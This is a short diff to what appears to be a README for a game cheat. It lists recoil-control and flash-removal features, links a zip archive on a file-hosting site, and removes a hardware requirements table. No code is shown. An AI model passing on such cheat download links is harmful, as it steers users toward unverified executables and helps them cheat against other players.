@@ -36,15 +36,7 @@ Download - https://www.mediafire.com/file/m8qga4qo9cv4cmt/Fc_Cheat_1.zip/file
 - **Recoil Control**: Recoil reduction system
 - **No Flash**: Flashbang effect reduction
 
-## 🛠️ System Requirements
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| CPU | Intel i5-4460 | Intel i7-7700K |
-| RAM | 8 GB | 16 GB |
-| GPU | NVIDIA GTX 960 | NVIDIA RTX 2060 |
-| Storage | 2 GB free space | 5 GB free space |
 
 ### Prerequisites
 - [.NET Framework 4.8](https://dotnet.microsoft.com/download/dotnet-framework/net48)
